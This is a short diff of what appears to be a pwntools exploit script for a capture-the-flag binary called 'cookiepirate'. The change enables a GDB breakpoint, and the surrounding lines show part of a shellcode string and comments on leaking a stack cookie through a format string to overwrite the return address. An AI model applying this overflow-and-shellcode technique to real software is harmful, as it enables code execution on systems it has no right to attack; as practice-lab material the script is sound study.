@@ -18,9 +18,9 @@ shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" \
 
 p = process('./cookiepirate')
 # Optional: attach GDB to the process and run some GDB commands
-# gdb.attach(p, '''
-# 	b *0x8048736
-# ''')
+gdb.attach(p, '''
+	b *0x8048736
+''')
 #Overflow first null byte in stack cookie. This way it will get printed in first format string.
 #Capture it, and send it back in second string, to overwrite ret val
 first = 'A' * 0x81
